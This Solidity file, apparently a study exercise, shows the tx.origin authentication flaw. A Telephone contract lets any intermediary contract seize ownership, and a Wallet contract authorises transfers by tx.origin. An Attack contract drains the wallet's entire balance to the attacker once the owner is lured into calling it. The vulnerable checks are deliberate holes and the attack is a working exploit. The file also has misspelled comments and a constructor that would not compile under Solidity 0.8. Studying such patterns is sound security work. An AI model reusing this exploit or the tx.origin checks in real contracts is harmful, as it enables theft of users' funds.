pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}


contract Wallet {
    address public owner;
    
    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner);

        //"safe" way for sending eth .. ("") >>>> If you are uncertain of
        // the function you are calling via abi, then putting the blank "" will
        // send you to the "recive" or "fallback" functions allowing your eth
        // to be accepted ..Below.. bo recieve, so default to "fallback"
        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send ether");

    }
}

contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }
    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }

}

